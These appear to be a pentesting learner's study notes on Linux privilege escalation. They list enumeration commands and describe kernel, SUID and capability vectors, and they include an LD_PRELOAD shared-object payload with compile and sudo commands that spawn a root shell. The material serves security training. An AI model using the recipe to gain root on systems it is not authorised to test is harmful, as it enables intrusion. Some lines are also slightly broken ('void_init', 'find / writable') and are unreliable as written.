---
description: Seventeenth section in Jr Penetration Tester learning path.
---

# Linux Privilege Escalation

### Introduction

Privilege escalation is the act of moving from a low privilege account to a high privilege account using a vulnerability exploit, design flaw or configuration oversight. Privilege escalation is crucial because it allows you to gain administrative access to a system which can allow:

* Password resets
* Bypass of access controls
* Editing software configurations
* Enabling persistence
* Changing privileges of other users
* Execution of admin commands

### Enumeration

Enumeration is important in post-compromise situations, below are useful commands/locations:

* `hostname` : returns hostname of target, can provide info depending on setup e.g. device may be named SQL-PROD for a production SQL server.
* `uname -a` : print system info about the kernel being used by the system.
* `/proc/version` : procfs (proc filesystem) provides info about target system processes, /version will give info on the kernel version and additional data like whether a compiler is installed.
* `/etc/issue` : contains info about the OS but is easily changed
* `ps` : shows all running processes for current shell, will show PID, TTY (terminal type used by user), Time (amount of CPU time used by process), CMD (command or executable running)
* `ps -A` : all running processes
* `ps axjf` : view process tree
* `ps aux` : show processes for all users - (a) for all users, (u) for user that launched the process and (x) for processes not attached to a terminal
* `env` : show environment variables, the PATH variable may have a compiler or scripting language that can be leveraged
* `sudo -l` : list commands your user can run using sudo
* `ls` : list files
* `ls -la` : list files and show hidden files
* `id` : overview of users privilege and group memberships
* `/etc/passwd` : shows users on system
* `history` : shows earlier commands, rarely can have info like usernames and passwords stored
* `ifconfig` : shows network interface information
* `netstat -a` : show all listening ports and established connections
* `netstat -l` : list ports only in listening mode
* `netstat -at/-au` : show TCP or UDP respectively&#x20;
* `netstat -ano` : display all sockets, do not resolve hostnames and display timers
* `find` : search system for potential escalation vectors
* `find / writable -type d 2>/dev/null` : find world-writable folders

### Kernel Exploits

Exploit methodology is simple:

1. Identify the kernel version
2. Search and find an exploit code for the kernel version of target
3. Run exploit

Although it appears simple, a failed kernel exploit can cause a system crash, it is always important to be careful. Before running kernel exploits you should fully understand what they do, some can cause irreversible system changes which cause issues later.

### Sudo Exploits (sudo -l)

Some systems may have the `LD_PRELOAD` environment option, this function allows any program to use shared libraries. If `"env_keep"` is enabled then a shared library can be generated which will be loaded and executed before a program is run. `LD_PRELOAD` will be ignored if the real user ID is different from the effective user ID. The steps can be summarised as:

1. Check for `LD_PRELOAD` (with `env_keep` option)
2. Write C code compiled as a share object (.so extension) file
3. Run program with sudo rights and `LD_PRELOAD` pointing to .so file

The C code which spawns a root shell is:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void_init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

This can be saved as `shell.c` and compiled with gcc into a shared object file:

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

This can then be run with sudo specifiying the `LD_PRELOAD` option:

```
sudo LD_PRELOAD=/home/user/preload/shell.so find
```

This will then spawn a shell with root privileges.

### SUID Exploits

The command `find / -type f -perm -04000 -ls 2>/dev/null` will show files that have their SUID or SGID bit set. Best practice is then to compare this against GTFOBins binaries to see if an exploit is available.

### Capability Exploits

Capabilities help manage privileges at a granular level. For example, a binary can have its capability set to allow it to run a task as a higher privilege. The getcap tool can be used to list enabled capabilities with `getcap -r / 2>/dev/null`.
